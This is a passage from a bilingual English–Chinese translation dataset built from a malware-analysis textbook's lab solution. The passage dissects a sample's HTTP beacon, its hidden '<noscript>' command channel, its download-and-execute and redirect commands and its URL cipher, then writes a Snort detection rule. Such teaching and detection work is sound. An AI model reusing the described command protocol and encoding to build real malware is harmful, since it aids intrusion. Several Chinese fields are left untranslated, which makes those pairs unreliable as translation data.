  zh: 
- en: Signatures that identify the initial requirements for a command
  id: totrans-4939
  prefs: []
  type: TYPE_NORMAL
  zh: 识别命令初始要求的签名
- en: 
  id: totrans-4940
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Signatures that identify specific attributes of command and argument pairs
  id: totrans-4941
  prefs: []
  type: TYPE_NORMAL
  zh: 识别命令和参数对特定属性的签名
- en: 9\.
  id: totrans-4942
  prefs: []
  type: TYPE_NORMAL
  zh: 9\.
- en: See the detailed analysis for specific signatures.
  id: totrans-4943
  prefs: []
  type: TYPE_NORMAL
  zh: 请参阅详细分析以获取特定签名。
- en: '***Detailed Analysis***'
  id: totrans-4944
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'Running the malware, we see that it produces the following beacon packet: GET
    /start.htm HTTP/1.1'
  id: totrans-4945
  prefs: []
  type: TYPE_NORMAL
  zh: 运行恶意软件，我们看到它产生了以下信标数据包：GET /start.htm HTTP/1.1
- en: 'Accept: */*'
  id: totrans-4946
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept: */*'
- en: 'Accept-Language: en-US'
  id: totrans-4947
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept-Language: en-US'
- en: 'UA-CPU: x86'
  id: totrans-4948
  prefs: []
  type: TYPE_NORMAL
  zh: 'UA-CPU: x86'
- en: '**1 4**'
  id: totrans-4949
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 4**'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-4950
  prefs: []
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;'
  id: totrans-4951
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;'
- en: .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
  id: totrans-4952
  prefs: []
  type: TYPE_NORMAL
  zh: .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
- en: 'Host: www.practicalmalwareanalysis.com'
  id: totrans-4953
  prefs: []
  type: TYPE_NORMAL
  zh: 'Host: www.practicalmalwareanalysis.com'
- en: 'Cache-Control: no-cache'
  id: totrans-4954
  prefs: []
  type: TYPE_NORMAL
  zh: 'Cache-Control: no-cache'
- en: We begin by identifying the networking functions used by the malware.
  id: totrans-4955
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先识别恶意软件使用的网络功能。
- en: 'Looking at the imports, we see functions from two libraries: WinINet and COM.
    The functions used include InternetOpenA, InternetOpenUrlA, InternetCloseHandle,
    and InternetReadFile.'
  id: totrans-4956
  prefs: []
  type: TYPE_NORMAL
  zh: 查看导入项，我们看到来自两个库的函数：WinINet和COM。使用的函数包括InternetOpenA、InternetOpenUrlA、InternetCloseHandle和InternetReadFile。
- en: Starting with the WinINet functions, navigate to the function containing InternetOpenUrlA
    at 0x004011F3\. Notice that there are some static strings in the code leading
    up to InternetOpenA as shown in Listing 14-5L.
  id: totrans-4957
  prefs: []
  type: TYPE_NORMAL
  zh: 从WinINet函数开始，导航到包含InternetOpenUrlA的函数，地址为0x004011F3。注意，在InternetOpenA之前有一些静态字符串在代码中，如列表14-5L所示。
- en: '"Accept: */*\nAccept-Language: en-US\nUA-CPU: x86\nAccept-Encoding: gzip, deflate"'
  id: totrans-4958
  prefs: []
  type: TYPE_NORMAL
  zh: '"Accept: */*\nAccept-Language: en-US\nUA-CPU: x86\nAccept-Encoding: gzip, deflate"'
- en: '"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR'
  id: totrans-4959
  prefs: []
  type: TYPE_NORMAL
  zh: '"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR'
- en: 3.0.4506.2152; .NET CLR 3.5.30729)"
  id: totrans-4960
  prefs: []
  type: TYPE_NORMAL
  zh: 3.0.4506.2152; .NET CLR 3.5.30729)"
- en: '*Listing 14-5L: Static strings used in beacon*'
  id: totrans-4961
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表14-5L：信标中使用的静态字符串*'
- en: Solutions to Labs
  id: totrans-4962
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**639**'
  id: totrans-4963
  prefs: []
  type: TYPE_NORMAL
  zh: '**639**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4964
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: These strings agree with the strings in the initial beacon. At first glance,
    they appear to be fairly common, but the combination of elements may actually
    be rare. By writing a signature that looks for a specific combination of headers,
    you can get a sense of exactly how rare the combination is based on how many times
    the signature is triggered.
  id: totrans-4965
  prefs: []
  type: TYPE_NORMAL
  zh: 这些字符串与初始信标中的字符串一致。乍一看，它们似乎相当常见，但元素组合实际上可能很罕见。通过编写一个寻找特定头部组合的签名，你可以根据签名被触发的次数来了解这种组合有多罕见。
- en: 'Take a second look at the strings in Listing 14-5L and compare them with the
    raw beacon packet at the beginning of the analysis. Do you notice the repeated
    User-Agent: User-Agent: in the beacon packet? Although it looks correct in the
    strings output, the malware author made a mistake and forgot that the InternetOpenA
    call includes the header title. This oversight will allow for an effective signature.'
  id: totrans-4966
  prefs: []
  type: TYPE_NORMAL
  zh: '仔细看看列表14-5L中的字符串，并与分析开始时的原始信标数据包进行比较。你注意到信标数据包中重复出现的 User-Agent: User-Agent:
    吗？尽管在字符串输出中看起来正确，但恶意软件作者犯了一个错误，忘记了 InternetOpenA 调用包括标题头。这个疏忽将允许一个有效的签名。'
- en: Let’s first identify the beacon content, and then we will investigate how the
    malware processes a response. We see that the networking function at 0x004011F3
    takes two parameters, only one of which is used before the InternetOpenUrlA call.
    This parameter is the URL that defines the beacon destination. The parent function
    is WinMain, which contains the primary loop with a Sleep call. Tracing the URL
    parameter backward within WinMain, we see that it is set in the function at 0x00401457,
    which contains a CreateFile call.
  id: totrans-4967
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们先确定信标内容，然后我们将调查恶意软件如何处理响应。我们看到在 0x004011F3 处的网络函数接受两个参数，在 InternetOpenUrlA
    调用之前只有一个被使用。这个参数是定义信标目的地的URL。父函数是 WinMain，它包含主循环和 Sleep 调用。在 WinMain 中回溯 URL 参数，我们看到它在
    0x00401457 处的函数中被设置，该函数包含一个 CreateFile 调用。
- en: This function (0x00401457) references a couple of strings, including C:\\ autobat.exe
    and http://www.practicalmalwareanalysis.com/start.htm. The static URL (ending
    in *start.htm*) appears to be on a branch that represents a failure to open a
    file, suggesting that it is the fallback beaconing URL if the file does not exist.
  id: totrans-4968
  prefs: []
  type: TYPE_NORMAL
  zh: 这个函数（0x00401457）引用了几个字符串，包括 C:\\ autobat.exe 和 http://www.practicalmalwareanalysis.com/start.htm。静态URL（以
    *start.htm* 结尾）似乎在一个表示无法打开文件的分支上，这表明如果文件不存在，它就是回退信标URL。
- en: Examining the CreateFile function, which uses the reference to *C:\\* *autobat.exe*,
    it appears as if the ReadFile command takes a buffer as an argument that is eventually
    passed all the way back to the InternetOpenUrlA function. Thus, we can conclude
    that *autobat.exe* is a configuration file that stores the URL in plaintext.
  id: totrans-4969
  prefs: []
  type: TYPE_NORMAL
  zh: 检查使用 *C:\\* *autobat.exe* 引用的 CreateFile 函数，看起来 ReadFile 命令将一个缓冲区作为参数，该参数最终被传递回
    InternetOpenUrlA 函数。因此，我们可以得出结论，*autobat.exe* 是一个配置文件，它以明文形式存储URL。
- en: Having identified all of the source components of the beacon, navigate back
    to the original call to identify what can happen after some content is received.
    Following the InternetReadFile call at 0x004012C7, we see another call to strstr,
    with one of the parameters being <no. This strstr function sits within two loops,
    with the outer call containing the InternetReadFile call to obtain more data,
    and the inner call containing the strstr function and a call to another function
    (0x00401000), which is called when we find the <no string, and which we can presume
    is an additional test of whether we have found the correct content. This hypothesis
    is confirmed when we examine the internal function.
  id: totrans-4970
  prefs: []
  type: TYPE_NORMAL
  zh: 在确定了信标的所有源组件后，返回到原始调用以确定接收一些内容后可能发生什么。在 0x004012C7 处的 InternetReadFile 调用之后，我们看到另一个对
    strstr 的调用，其中一个参数是 <no。这个 strstr 函数位于两个循环中，外层调用包含对 InternetReadFile 的调用以获取更多数据，内层调用包含
    strstr 函数和对另一个函数（0x00401000）的调用，该函数在我们找到 <no 字符串时被调用，我们可以假设这是对是否找到正确内容的额外测试。当我们检查内部函数时，这个假设得到了证实。
- en: Figure 14-4L shows a test of the input buffer using a chain of small connected
    blocks. The attacker has tried to disguise the string he is looking for by breaking
    the comparison into many small tests to eliminate the telltale comparison string.
    Additionally, notice that the required string (<noscript>) is mixed up in order
    to avoid producing an obvious pattern. The first three comparisons in Figure 14-4L
    are the n in position 0, the i in position 5, and the o in position 1\.
  id: totrans-4971
  prefs: []
  type: TYPE_NORMAL
  zh: 图14-4L显示了使用一系列小连接块对输入缓冲区进行测试。攻击者试图通过将比较分解成许多小测试来伪装他正在寻找的字符串，以消除明显的比较字符串。此外，请注意，所需的字符串（<noscript>）被混合在一起，以避免产生明显的模式。图14-4L中的前三个比较是位置0的'n'，位置5的'i'和位置1的'o'。
- en: Two large comparison blocks follow the single-byte comparisons. The first contains
    a search for the / character, as well as a string comparison (strstr) of two strings,
    both of which are passed in as arguments. With some **640**
  id: totrans-4972
  prefs: []
  type: TYPE_NORMAL
  zh: 在单字节比较之后，有两个大的比较块。第一个包含对/字符的搜索以及两个字符串的字符串比较（strstr），这两个字符串都作为参数传递。一些**640**
- en: Appendix C
  id: totrans-4973
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4974
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 145](index-674_1.png)'
  id: totrans-4975
  prefs: []
  type: TYPE_IMG
  zh: '![Image 145](index-674_1.png)'
- en: backtracking, it is clear that one of the arguments is the string that has been
    read in from the Internet, and the other is the URL that originally came from
    the configuration file. The search for the / is a backward search within the URL.
    Once found, the / is converted to a NULL to NULL-terminate the string. Essentially,
    this block is searching for the URL (minus the filename) within the returned buffer.
  id: totrans-4976
  prefs: []
  type: TYPE_NORMAL
  zh: 回溯，很明显，其中一个参数是从互联网上读取的字符串，另一个是来自配置文件的原始URL。对/的搜索是URL内的反向搜索。一旦找到，将/转换为NULL以空终止字符串。本质上，这个块是在返回的缓冲区中搜索URL（减去文件名）。
- en: '*Figure 14-4L: Obfuscated string comparison*'
  id: totrans-4977
  prefs: []
  type: TYPE_NORMAL
  zh: '*图14-4L：混淆的字符串比较*'
- en: 'The second block is a search for the static string 96'' starting at the end
    of the truncated URL. There are two paths at the bottom of the function: one representing
    a failure to find the desired characteristics and one represent-1 4'
  id: totrans-4978
  prefs: []
  type: TYPE_NORMAL
  zh: 第二个块是在截断URL的末尾开始搜索静态字符串96'。函数底部有两个路径：一个代表未能找到所需特征，另一个代表-1 4
- en: ing success. Notice the large number of paths focused on the failure state (loc_401141).
    These paths represent an early termination of the search.
  id: totrans-4979
  prefs: []
  type: TYPE_NORMAL
  zh: 成功的路径。注意大量关注失败状态的路径（loc_401141）。这些路径代表搜索的早期终止。
- en: 'In summary, assuming that the default URL is being used, the filter function
    in this part of the code is looking for the following (the ellipsis after the
    noscript tag represents variable content):'
  id: totrans-4980
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，假设正在使用默认URL，这部分代码中的过滤器函数正在寻找以下内容（noscript标签后面的省略号表示可变内容）：
- en: <noscript>... http://www.practicalmalwareanalysis.com *returned_content* 96'
  id: totrans-4981
  prefs: []
  type: TYPE_NORMAL
  zh: <noscript>... http://www.practicalmalwareanalysis.com *返回内容* 96'
- en: Now, let’s shift focus to what happens with the returned content. Returning
    to WinMain, we see that the function at 0x00401684 immediately follows the Internet
    function (0x004011F3) and takes a similar parameter, which turns out to be the
    URL.
  id: totrans-4982
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们将重点转向返回的内容。回到WinMain，我们看到0x00401684处的函数紧随Internet函数（0x004011F3）之后，并接受一个类似的参数，结果证明这个参数是URL。
- en: 'This is the decision function, which is confirmed by recognizing the switch
    structure that uses a jump table. Before the switch structure, strtok is used
    to divide the command content into two parts, which are put into two variables.
    The following is the disassembly that pulls the first character out of the first
    string and uses it for the switch statement:'
  id: totrans-4983
  prefs: []
  type: TYPE_NORMAL
  zh: 这是决策函数，这通过识别使用跳转表的switch结构得到证实。在switch结构之前，使用strtok将命令内容分成两部分，这两部分被放入两个变量中。以下是从第一个字符串中提取第一个字符并将其用于switch语句的反汇编代码：
- en: 004016BF mov ecx, [ebp+var_10]
  id: totrans-4984
  prefs: []
  type: TYPE_NORMAL
  zh: 004016BF mov ecx, [ebp+var_10]
- en: 004016C2 movsx edx, byte ptr [ecx]
  id: totrans-4985
  prefs: []
  type: TYPE_NORMAL
  zh: 004016C2 movsx edx, byte ptr [ecx]
- en: Solutions to Labs
  id: totrans-4986
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**641**'
  id: totrans-4987
  prefs: []
  type: TYPE_NORMAL
  zh: '**641**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4988
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 146](index-675_1.png)'
  id: totrans-4989
  prefs: []
  type: TYPE_IMG
  zh: '![Image 146](index-675_1.png)'
- en: 004016C5 mov [ebp+var_14], edx
  id: totrans-4990
  prefs: []
  type: TYPE_NORMAL
  zh: 004016C5 mov [ebp+var_14], edx
- en: 004016C8 mov eax, [ebp+var_14]
  id: totrans-4991
  prefs: []
  type: TYPE_NORMAL
  zh: 004016C8 mov eax, [ebp+var_14]
- en: 004016CB sub eax, 'd'
  id: totrans-4992
  prefs: []
  type: TYPE_NORMAL
  zh: 004016CB sub eax, 'd'
- en: Case 0 is the character 'd'. All other
  id: totrans-4993
  prefs: []
  type: TYPE_NORMAL
  zh: Case 0是字符'd'。所有其他
- en: cases are greater than that value by 10, 14,
  id: totrans-4994
  prefs: []
  type: TYPE_NORMAL
  zh: 的情况比该值大10、14，
- en: and 15, which translates to 'n', 'r', and
  id: totrans-4995
  prefs: []
  type: TYPE_NORMAL
  zh: 和15，这对应于'n'、'r'和
- en: '''s''. The ''n'' function is the easiest one to'
  id: totrans-4996
  prefs: []
  type: TYPE_NORMAL
  zh: '''s''。''n''函数是最容易的一个'
- en: figure out, since it does nothing other
  id: totrans-4997
  prefs: []
  type: TYPE_NORMAL
  zh: 弄清楚，因为它没有做其他
- en: than set a variable that causes the main
  id: totrans-4998
  prefs: []
  type: TYPE_NORMAL
  zh: than set a variable that causes the main
- en: loop to exit. The 's' function turns out to
  id: totrans-4999
  prefs: []
  type: TYPE_NORMAL
  zh: loop to exit. The 's' function turns out to
- en: be sleep, and it uses the second part of the
  id: totrans-5000
  prefs: []
  type: TYPE_NORMAL
  zh: 睡眠，并使用图14-5L中共享函数的第二部分
- en: command directly as a number value for
  id: totrans-5001
  prefs: []
  type: TYPE_NORMAL
  zh: command directly as a number value for
- en: the sleep command. The 'r' and 'd' func-
  id: totrans-5002
  prefs: []
  type: TYPE_NORMAL
  zh: the sleep command. The 'r' and 'd' func-
- en: tions are related, as they both pass the sec-
  id: totrans-5003
  prefs: []
  type: TYPE_NORMAL
  zh: tions are related, as they both pass the sec-
- en: ond part of the command into the same
  id: totrans-5004
  prefs: []
  type: TYPE_NORMAL
  zh: ond part of the command into the same
- en: function early in their execution, as shown
  id: totrans-5005
  prefs: []
  type: TYPE_NORMAL
  zh: function early in their execution, as shown
- en: in Figure 14-5L.
  id: totrans-5006
  prefs: []
  type: TYPE_NORMAL
  zh: in Figure 14-5L.
- en: The 'd' function calls both
  id: totrans-5007
  prefs: []
  type: TYPE_NORMAL
  zh: '''d''函数调用两个'
- en: URLDownloadToCacheFileA and CreateProcessA,
  id: totrans-5008
  prefs: []
  type: TYPE_NORMAL
  zh: URLDownloadToCacheFileA和CreateProcessA的代码，
- en: and looks very much like the code from
  id: totrans-5009
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来非常像来自
- en: Lab 14-1\. The URL is provided by the out-
  id: totrans-5010
  prefs: []
  type: TYPE_NORMAL
  zh: Lab 14-1\. URL由输出提供
- en: put of the shared function in Figure 14-5L
  id: totrans-5011
  prefs: []
  type: TYPE_NORMAL
  zh: put of the shared function in Figure 14-5L
- en: (0x00401147), which we can now assume
  id: totrans-5012
  prefs: []
  type: TYPE_NORMAL
  zh: (0x00401147)，我们可以现在假设
- en: '*Figure 14-5L: Function graph*'
  id: totrans-5013
  prefs: []
  type: TYPE_NORMAL
  zh: '*Figure 14-5L: 函数图*'
- en: is some sort of decoding function. The 'r'
  id: totrans-5014
  prefs: []
  type: TYPE_NORMAL
  zh: is some sort of decoding function. The 'r'
- en: '*showing the connection between*'
  id: totrans-5015
  prefs: []
  type: TYPE_NORMAL
  zh: '*显示连接*'
- en: function also uses the encoding function,
  id: totrans-5016
  prefs: []
  type: TYPE_NORMAL
  zh: function also uses the encoding function,
- en: '*the ''r'' and ''d'' commands*'
  id: totrans-5017
  prefs: []
  type: TYPE_NORMAL
  zh: '*the ''r'' and ''d'' commands*'
- en: and it takes the output and uses it in the
  id: totrans-5018
  prefs: []
  type: TYPE_NORMAL
  zh: 并将输出用作
- en: function at 0x00401372, which references CreateFile, WriteFile, and the same
    *C:\\autobat.exe* configuration file referenced earlier. From this evidence, we
    can infer that the intent of the 'r' function is to redirect the malware to a
    different beacon site by overwriting the configuration file.
  id: totrans-5019
  prefs: []
  type: TYPE_NORMAL
  zh: 函数在0x00401372，它引用了CreateFile、WriteFile以及之前提到的相同的 *C:\\autobat.exe* 配置文件。从这个证据中，我们可以推断出'r'函数的意图是通过覆盖配置文件将恶意软件重定向到不同的信标站点。
- en: 'Lastly, let’s look into the encoding function used for the redirect and download
    functions. We already know that once decoded, the contents are used as a URL.
    Examining the decoding function at 0x00401147, notice the loop in the lower-right
    corner. At the start of the loop is a call to strlen, which implies that the input
    is encoded in pieces. Examining the end of the loop, we see that before returning
    to the top, the variable containing the output (identified by its presence at
    the end of the function) is increased by one, while the source function is increased
    by two. The function takes two characters at a time from the source, turns them
    into a number (with the atoi function), and then uses that number as an index
    into the following string:'
  id: totrans-5020
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，让我们看看用于重定向和下载功能的编码函数。我们已经知道解码后的内容被用作URL。检查0x00401147处的解码函数，注意右下角的循环。在循环开始时，有一个对strlen的调用，这意味着输入是分块编码的。检查循环的末尾，我们看到在返回顶部之前，包含输出的变量（通过其在函数末尾的存在被识别）增加了一个，而源函数增加了两个。该函数每次从源中取两个字符，将它们转换为数字（使用atoi函数），然后使用该数字作为以下字符串的索引：
- en: /abcdefghijklmnopqrstuvwxyz0123456789:.
  id: totrans-5021
  prefs: []
  type: TYPE_NORMAL
  zh: /abcdefghijklmnopqrstuvwxyz0123456789:.
- en: '**642**'
  id: totrans-5022
  prefs: []
  type: TYPE_NORMAL
  zh: '**642**'
- en: Appendix C
  id: totrans-5023
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5024
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: While this string looks somewhat similar to a Base64 string, it doesn’t have
    capital letters, and it has only 39 characters. (A URL can be adequately described
    with only lowercase letters.) Given our understanding of the algorithm, let’s
    encode the default URL for the malware with the encoding shown in Figure 14-6L.
  id: totrans-5025
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然这个字符串看起来与Base64字符串有些相似，但它没有大写字母，并且只有39个字符。（一个URL可以用仅小写字母充分描述。）根据我们对算法的理解，让我们用图14-6L中显示的编码对恶意软件的默认URL进行编码。
- en: '**h**'
  id: totrans-5026
  prefs: []
  type: TYPE_NORMAL
  zh: '**h**'
- en: '**t**'
  id: totrans-5027
  prefs: []
  type: TYPE_NORMAL
  zh: '**t**'
- en: '**t**'
  id: totrans-5028
  prefs: []
  type: TYPE_NORMAL
  zh: '**t**'
- en: '**p**'
  id: totrans-5029
  prefs: []
  type: TYPE_NORMAL
  zh: '**p**'
- en: '**:**'
  id: totrans-5030
  prefs: []
  type: TYPE_NORMAL
  zh: '**:**'
- en: '**/**'
  id: totrans-5031
  prefs: []
  type: TYPE_NORMAL
  zh: '**/**'
- en: '**/**'
  id: totrans-5032
  prefs: []
  type: TYPE_NORMAL
  zh: '**/**'
- en: '**w w w**'
  id: totrans-5033
  prefs: []
  type: TYPE_NORMAL
  zh: '**w w w**'
- en: '**.**'
  id: totrans-5034
  prefs: []
  type: TYPE_NORMAL
  zh: '**.**'
- en: '**p**'
  id: totrans-5035
  prefs: []
  type: TYPE_NORMAL
  zh: '**p**'
- en: '**r**'
  id: totrans-5036
  prefs: []
  type: TYPE_NORMAL
  zh: '**r**'
- en: '**a**'
  id: totrans-5037
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**c**'
  id: totrans-5038
  prefs: []
  type: TYPE_NORMAL
  zh: '**c**'
- en: '**t**'
  id: totrans-5039
  prefs: []
  type: TYPE_NORMAL
  zh: '**t**'
- en: '**i**'
  id: totrans-5040
  prefs: []
  type: TYPE_NORMAL
  zh: '**i**'
- en: '**c**'
  id: totrans-5041
  prefs: []
  type: TYPE_NORMAL
  zh: '**c**'
- en: '**a**'
  id: totrans-5042
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**l**'
  id: totrans-5043
  prefs: []
  type: TYPE_NORMAL
  zh: '**l**'
- en: 08 20 20 16 37 00 00 23 23 23 38 16 18 01 03 20 09 03 01 12
  id: totrans-5044
  prefs: []
  type: TYPE_NORMAL
  zh: 08 20 20 16 37 00 00 23 23 23 38 16 18 01 03 20 09 03 01 12
- en: '**m**'
  id: totrans-5045
  prefs: []
  type: TYPE_NORMAL
  zh: '**m**'
- en: '**a**'
  id: totrans-5046
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**l**'
  id: totrans-5047
  prefs: []
  type: TYPE_NORMAL
  zh: '**l**'
- en: '**w**'
  id: totrans-5048
  prefs: []
  type: TYPE_NORMAL
  zh: '**w**'
- en: '**a**'
  id: totrans-5049
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**r**'
  id: totrans-5050
  prefs: []
  type: TYPE_NORMAL
  zh: '**r**'
- en: '**e**'
  id: totrans-5051
  prefs: []
  type: TYPE_NORMAL
  zh: '**e**'
- en: '**a**'
  id: totrans-5052
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**n**'
  id: totrans-5053
  prefs: []
  type: TYPE_NORMAL
  zh: '**n**'
- en: '**a**'
  id: totrans-5054
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**l**'
  id: totrans-5055
  prefs: []
  type: TYPE_NORMAL
  zh: '**l**'
- en: '**y**'
  id: totrans-5056
  prefs: []
  type: TYPE_NORMAL
  zh: '**y**'
- en: '**s**'
  id: totrans-5057
  prefs: []
  type: TYPE_NORMAL
  zh: '**s**'
- en: '**i**'
  id: totrans-5058
  prefs: []
  type: TYPE_NORMAL
  zh: '**i**'
- en: '**s**'
  id: totrans-5059
  prefs: []
  type: TYPE_NORMAL
  zh: '**s**'
- en: '**.**'
  id: totrans-5060
  prefs: []
  type: TYPE_NORMAL
  zh: '**.**'
- en: '**c**'
  id: totrans-5061
  prefs: []
  type: TYPE_NORMAL
  zh: '**c**'
- en: '**o**'
  id: totrans-5062
  prefs: []
  type: TYPE_NORMAL
  zh: '**o**'
- en: '**m**'
  id: totrans-5063
  prefs: []
  type: TYPE_NORMAL
  zh: '**m**'
- en: '**/**'
  id: totrans-5064
  prefs: []
  type: TYPE_NORMAL
  zh: '**/**'
- en: '**s**'
  id: totrans-5065
  prefs: []
  type: TYPE_NORMAL
  zh: '**s**'
- en: '**t**'
  id: totrans-5066
  prefs: []
  type: TYPE_NORMAL
  zh: '**t**'
- en: '**a**'
  id: totrans-5067
  prefs: []
  type: TYPE_NORMAL
  zh: '**a**'
- en: '**r**'
  id: totrans-5068
  prefs: []
  type: TYPE_NORMAL
  zh: '**r**'
- en: '**t**'
  id: totrans-5069
  prefs: []
  type: TYPE_NORMAL
  zh: '**t**'
- en: '**.**'
  id: totrans-5070
  prefs: []
  type: TYPE_NORMAL
  zh: '**.**'
- en: '**h**'
  id: totrans-5071
  prefs: []
  type: TYPE_NORMAL
  zh: '**h**'
- en: '**t**'
  id: totrans-5072
  prefs: []
  type: TYPE_NORMAL
  zh: '**t**'
- en: '**m**'
  id: totrans-5073
  prefs: []
  type: TYPE_NORMAL
  zh: '**m**'
- en: 13 01 12 23 01 18 05 01 14 01 12 25 19 09 19 38 03 15 13 00 19 20 01 18 20 38
    08 20 13
  id: totrans-5074
  prefs: []
  type: TYPE_NORMAL
  zh: 13 01 12 23 01 18 05 01 14 01 12 25 19 09 19 38 03 15 13 00 19 20 01 18 20 38
    08 20 13
- en: '*Figure 14-6L: Example encoding of default URL with custom cipher* As you can
    see, any encoding of a URL that starts with *http://* will always have the string
    08202016370000\.'
  id: totrans-5075
  prefs: []
  type: TYPE_NORMAL
  zh: '*Figure 14-6L: 使用自定义密码的默认URL的示例编码* 如您所见，任何以 *http://* 开头的URL编码都将始终包含字符串 08202016370000\.'
- en: 'Now, let’s use what we’ve learned to generate a suitable set of signatures
    for the malware. Overall, we have three kinds of communication: beacon packets,
    commands embedded in web pages, and a request to download and execute a file.
    Since the request to download is based entirely on the data that comes from the
    attacker, it is difficult to produce a signature for it.'
  id: totrans-5076
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们利用我们所学的知识来生成一组适合恶意软件的签名。总体而言，我们有三种类型的通信：信标数据包、嵌入网页中的命令以及下载并执行文件的请求。由于下载请求完全基于来自攻击者的数据，因此很难为其生成签名。
- en: '**Beacon**'
  id: totrans-5077
  prefs: []
  type: TYPE_NORMAL
  zh: '**信标**'
- en: 'The beacon packet has the following structure:'
  id: totrans-5078
  prefs: []
  type: TYPE_NORMAL
  zh: 信标数据包具有以下结构：
- en: GET */start.htm* HTTP/1.1
  id: totrans-5079
  prefs: []
  type: TYPE_NORMAL
  zh: GET */start.htm* HTTP/1.1
- en: '**Accept: */***'
  id: totrans-5080
  prefs: []
  type: TYPE_NORMAL
  zh: '**Accept: */*** '
- en: '**Accept-Language: en-US**'
  id: totrans-5081
  prefs: []
  type: TYPE_NORMAL
  zh: '**Accept-Language: en-US**'
- en: '**UA-CPU: x86**'
  id: totrans-5082
  prefs: []
  type: TYPE_NORMAL
  zh: '**UA-CPU: x86**'
- en: '**1 4**'
  id: totrans-5083
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 4**'
- en: '**Accept-Encoding: gzip, deflate**'
  id: totrans-5084
  prefs: []
  type: TYPE_NORMAL
  zh: '**Accept-Encoding: gzip, deflate**'
- en: 'User-Agent: **User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;**'
  id: totrans-5085
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: **User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;**'
- en: '**.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)**'
  id: totrans-5086
  prefs: []
  type: TYPE_NORMAL
  zh: '**.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)**'
- en: 'Host: *www.practicalmalwareanalysis.com*'
  id: totrans-5087
  prefs: []
  type: TYPE_NORMAL
  zh: 'Host: *www.practicalmalwareanalysis.com*'
- en: 'Cache-Control: no-cache'
  id: totrans-5088
  prefs: []
  type: TYPE_NORMAL
  zh: 'Cache-Control: no-cache'
- en: The elements in italic are defined by the URL, and they can be ephemeral (though
    they should certainly be used if known). The bold elements are static and come
    from two different strings in the code (see Listing 14-5L).
  id: totrans-5089
  prefs: []
  type: TYPE_NORMAL
  zh: 斜体中的元素由 URL 定义，它们可能是短暂的（尽管如果已知，则肯定应该使用）。粗体元素是静态的，来自代码中的两个不同字符串（参见列表 14-5L）。
- en: 'Since the attacker made a mistake by including an extra User-Agent:, the obvious
    signature to target is the specific User-Agent string with the additional User-Agent
    header:'
  id: totrans-5090
  prefs: []
  type: TYPE_NORMAL
  zh: 由于攻击者错误地包含了一个额外的 User-Agent:，因此要针对的明显签名是带有附加 User-Agent 标头的特定 User-Agent 字符串：
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.3.1 Specific
    User-Agent with duplicate header"; content:"User-Agent|3a20|User-Agent|3a20|
  id: totrans-5091
  prefs: []
  type: TYPE_NORMAL
  zh: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.3.1 具有重复头部的特定
    User-Agent"; content:"User-Agent|3a20|User-Agent|3a20| '
- en: Mozilla/4.0|20|(compatible\;|20|MSIE|20|7.0\;|20|Windows|20|NT|20|5.1\;|20|
  id: totrans-5092
  prefs: []
  type: TYPE_NORMAL
  zh: Mozilla/4.0|20|(compatible\;|20|MSIE|20|7.0\;|20|Windows|20|NT|20|5.1\;|20|
- en: .NET|20|CLR|20|3.0.4506.2152\;|20|.NET|20|CLR|20|3.5.30729)"; http_header; sid:20001431;
    rev:1;)
  id: totrans-5093
  prefs: []
  type: TYPE_NORMAL
